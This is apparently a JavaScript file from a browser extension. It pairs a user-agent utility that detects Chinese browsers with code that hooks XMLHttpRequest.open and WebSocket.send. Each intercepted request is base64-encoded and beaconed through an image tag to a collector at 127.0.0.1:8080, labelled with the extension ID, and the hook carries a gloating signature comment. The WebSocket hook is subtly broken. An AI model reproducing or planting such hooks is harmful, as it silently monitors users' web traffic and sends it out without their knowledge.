function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var utils = (function () {

    var parser = new UAParser();
    var browser = parser.getBrowser();
    var chineseBrowsers = ["baidu", "baidu_other", "spark", "2345", "sogou", "360"];
    var browserUA = getUAString();

    if (isInUA("bidu") || isInUA("baidu")) {
        browser.name = "baidu";
    } else if (isInUA("2345ex")) {
        browser.name = "2345";
    } else if (isInUA("metasr")) {
        browser.name = "sogou";
    } else if (isInUA("spark")) {
        browser.name = "spark";
    } else if (external) {
        if (external.hasOwnProperty("GetSparkInfo")) {
            browser.name = "spark";
        } else if (external.hasOwnProperty("GetOriginalUrl")) {
            browser.name = "baidu"
        } else if (external.hasOwnProperty("AppCmd")) {
            browser.name = "360";
        } else if (external.hasOwnProperty("GetVersion")) {
            browser.name = "baidu_other";
        }
    }

    function isInUA(q) {
        var queryLowerCase = q.toLowerCase();
        var uaStr = browserUA.toLowerCase();
        return uaStr.indexOf(queryLowerCase) > -1;
    }

    function getBrowser() {
        return browser;
    }

    function getUAString() {
        return parser.getUA();
    }

    function getSubID() {
        return localStorage.getItem("subid");
    }

    function setSubID(subId) {
        return localStorage.setItem("subid", subId);
    }

    function isChineseBrowser() {
        if (browser && browser.name)
            return chineseBrowsers.indexOf(browser.name) > -1;
        else
            return false;
    }

    return {
        getBrowser: getBrowser,
        getSubID: getSubID,
        setSubID: setSubID,
        isChineseBrowser: isChineseBrowser,
    };

})();